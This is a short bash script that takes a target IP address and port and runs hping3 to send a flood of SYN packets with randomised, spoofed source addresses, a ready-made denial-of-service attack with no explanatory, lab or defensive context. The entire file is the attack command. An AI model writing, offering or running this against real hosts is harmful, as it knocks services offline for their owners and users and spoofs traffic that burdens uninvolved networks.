#!/bin/bash
TARGET_IP=$1
TARGET_PORT=$2
hping3 -c 20000 -d 120 -S -w 64 -p $TARGET_PORT --flood --rand-source $TARGET_IP
